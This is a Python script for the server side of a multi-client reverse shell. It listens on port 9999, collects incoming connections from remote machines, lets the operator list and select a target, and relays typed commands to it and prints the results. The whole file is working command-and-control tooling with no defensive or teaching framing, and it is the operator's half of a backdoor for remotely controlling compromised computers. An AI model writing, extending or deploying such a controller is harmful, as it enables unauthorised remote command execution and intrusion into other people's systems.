#!/usr/bin/env python3
import socket
import sys
import time
import threading
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_adresses = []

#Create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#bind socket to port and wait for connection.
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port %s..." % str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()

#Accept connections from multiple clients and save to list.
def accept_connections():
    for c in all_connections: #Initialize by closing all connections
        c.close() #Close those connections!
    del all_connections[:] #Clear out the lists
    del all_adresses[:]

    while True: 
        try: 
            conn, adress = s.accept()
            conn.setblocking(1) #Disable timeout
            all_connections.append(conn) #Append connections and adresses.
            all_adresses.append(adress) 
            print("\nConnection from host %s has established." % adress[0])
        except:
            print("Error accepting connections. ")

# Interactive Prompt for sending commands remotely
def start_shell(): 
    while True:
        cmd = input('> ')
        if cmd == 'list':
            list_connections() #Show all connected computers
            continue
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None: #Make sure the connection is valid.
                send_target_commands(conn) #Send commands now,
        else:
            print("Command not found.")
#Displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_adresses[i]
            continue
        results += str(i) + '   ' + str(all_adresses[i][0]) + '   ' + str(all_adresses[i][1]) + '\n'
    print('###### CLIENTS ######' + '\n' + results)


# Select a target client
def get_target(cmd):
    #command example: "select 0" : s1e2l3e4c5t6 708
    try:
        target = int(cmd.replace('select ', ''))
        conn = all_connections[target]
        print("You are now connected to %s" % str(all_adresses[target][0]))
        print(str(all_adresses[target][0]) + '> ', end="")
        return conn
    except:
        print("Selection is not valid.")
        return None


#Connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
            if cmd == 'exit':
                break
        except:
            print("Connection has been lost!")
            break


#Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


#Do the next job in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_shell()
        queue.task_done()


#Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()